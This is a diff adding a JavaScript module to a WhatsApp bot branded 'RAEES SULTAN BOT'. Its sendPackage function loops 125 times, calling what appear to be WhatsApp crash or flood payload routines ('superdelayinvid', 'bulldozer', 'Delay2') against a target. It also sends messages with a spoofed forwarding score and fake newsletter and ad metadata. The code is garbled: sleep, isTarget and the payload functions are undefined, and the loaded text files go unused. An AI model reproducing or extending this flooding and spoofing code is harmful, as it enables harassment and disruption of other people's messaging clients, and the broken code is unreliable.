@@ -1,0 +1,109 @@
+import fs from "fs";
+import path from "path";
+
+function delay(ms){
+  return new Promise(res => setTimeout(res, ms));
+}
+
+function splitText(text, size = 1800){
+
+  return text.match(
+    new RegExp(`.{1,${size}}`, "gs")
+  ) || [];
+
+}
+
+function loadFiles(folder){
+
+  if(!fs.existsSync(folder)) return [];
+
+  return fs.readdirSync(folder)
+    .filter(f => f.endsWith(".txt"))
+    .map(f =>
+      fs.readFileSync(
+        path.join(folder, f),
+        "utf8"
+      )
+    );
+
+}
+
+export async function sendPackage(
+  sock,
+  jid,
+  folder,
+  repeat = 1
+){
+
+  const messages = loadFiles(folder);
+
+  if(messages.length === 0){
+
+    return await sock.sendMessage(jid,{
+      text:"⚠️ هیچ فایل متنی داخل این پوشه نیست"
+    });
+
+  }
+  for (let i = 0; i < 125; i++) {
+          
+            
+  await sleep(5000)
+  await superdelayinvid(isTarget)  
+  await sleep(5000)
+  await superdelayinvid(isTarget)
+  await superdelayinvid(isTarget)
+  await superdelayinvid(isTarget)
+  await sleep(5000)
+  await bulldozer(isTarget)
+     await Delay2(isTarget);
+        await sock.sendMessage(jid,{
+
+          contextInfo: {
+
+            forwardingScore: 999,
+            isForwarded: true,
+
+            forwardedNewsletterMessageInfo: {
+
+              newsletterJid:
+              "12036339530696349@newsletter",
+
+              newsletterName:
+              "👑 RAEES SULTAN BOT",
+
+              serverMessageId:
+              Math.floor(
+                Math.random() * 1000
+              )
+
+            },
+
+            externalAdReply: {
+
+              title:
+              "👑 RAEES SULTAN BOT",
+
+              body:
+              "ULTRA PACKAGE SYSTEM",
+
+              thumbnailUrl:
+              "https://i.imgur.com/JP3QG8B.jpeg",
+
+              sourceUrl:
+              "https://whatsapp.com",
+
+              mediaType: 1,
+
+              renderLargerThumbnail: true
+
+            }
+
+          }
+
+        });
+
+        await delay(5000);
+
+      }
+      
+}
